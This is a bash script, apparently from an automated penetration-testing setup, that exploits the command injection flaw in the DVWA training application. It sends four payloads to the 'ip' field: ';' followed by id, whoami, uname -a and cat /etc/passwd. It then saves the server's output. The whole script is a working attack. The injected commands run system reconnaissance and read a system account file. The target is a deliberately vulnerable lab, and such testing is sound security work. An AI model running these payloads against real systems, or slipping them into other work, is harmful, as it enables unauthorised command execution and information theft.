#!/usr/bin/env bash
# DVWA Command Injection (security=low): the 'ip' field on /vulnerabilities/exec/
# is passed to a shell ping with no sanitisation, so ';' chains arbitrary commands.
# Uses the authenticated cookie from _bootstrap.sh and extracts the <pre> output.
set -uo pipefail
COOKIE=$(cat /opt/argus-ai/gemini-scans/dvwa/.dvwa-sqlmap-cookie)
TARGET="http://target-w/vulnerabilities/exec/"
OUT="/opt/argus-ai/gemini-scans/dvwa/04-cmdi.txt"

payloads=(
  "127.0.0.1; id"
  "127.0.0.1; whoami"
  "127.0.0.1; uname -a"
  "127.0.0.1; cat /etc/passwd"
)

{
  echo "### DVWA Command Injection (low) — POST 'ip' to /vulnerabilities/exec/ ###"
  echo "### Each payload appends a shell command after a legitimate ping target. ###"
  for p in "${payloads[@]}"; do
    echo
    echo "=== payload: ip='$p' ==="
    curl -s -b "$COOKIE" \
         --data-urlencode "ip=$p" --data "Submit=Submit" "$TARGET" \
      | sed -n '/<pre>/,/<\/pre>/p' | sed 's/<[^>]*>//g'
  done
} 2>&1 | tee "$OUT"
